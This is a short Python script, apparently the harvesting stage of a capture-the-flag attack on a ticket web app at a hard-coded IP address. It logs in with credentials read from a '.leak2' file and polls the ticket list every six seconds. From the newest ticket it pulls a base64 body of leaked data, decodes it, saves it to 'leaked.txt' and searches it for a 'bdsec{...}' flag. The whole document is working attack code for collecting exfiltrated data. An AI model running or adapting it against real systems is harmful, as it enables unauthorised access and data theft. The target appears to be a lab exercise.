import urllib.request,urllib.parse,http.cookiejar,time,re,base64,sys
U="http://45.33.28.244:3000"
LU,LP=open('.leak2').read().split()
def op():
    cj=http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
for i in range(30):
    time.sleep(6)
    o=op()
    try:
        r=o.open(urllib.request.Request(U+'/login',data=urllib.parse.urlencode({'username':LU,'password':LP}).encode()),timeout=8)
        html=o.open(U+'/tickets',timeout=8).read().decode('latin1')
    except Exception as e:
        print(f"[{(i+1)*6}s] err {e}",flush=True); continue
    ids=re.findall(r'/ticket/(\d+)',html)
    print(f"[{(i+1)*6}s] leak tickets: {ids if ids else 'none (acct not created yet)'}",flush=True)
    if ids:
        tid=ids[-1]
        body=o.open(U+'/ticket/'+tid,timeout=8).read().decode('latin1')
        bm=re.search(r'ticket-body">\s*(.*?)\s*</div>',body,re.S)
        b64=(bm.group(1) if bm else '').strip()
        print("LEAK ticket",tid,"b64len",len(b64),flush=True)
        try:
            dec=base64.b64decode(b64+'===').decode('utf-8','replace')
            open('leaked.txt','w').write(dec)
            fl=re.search(r'(?i)(bdsec\{[^}]*\})',dec)
            print("FLAG:", fl.group(1) if fl else "(no flag in decoded; see leaked.txt)",flush=True)
        except Exception as e:
            print("decode err",e,"raw:",b64[:200],flush=True)
        break
else:
    print("TIMEOUT: no leak ticket appeared",flush=True)
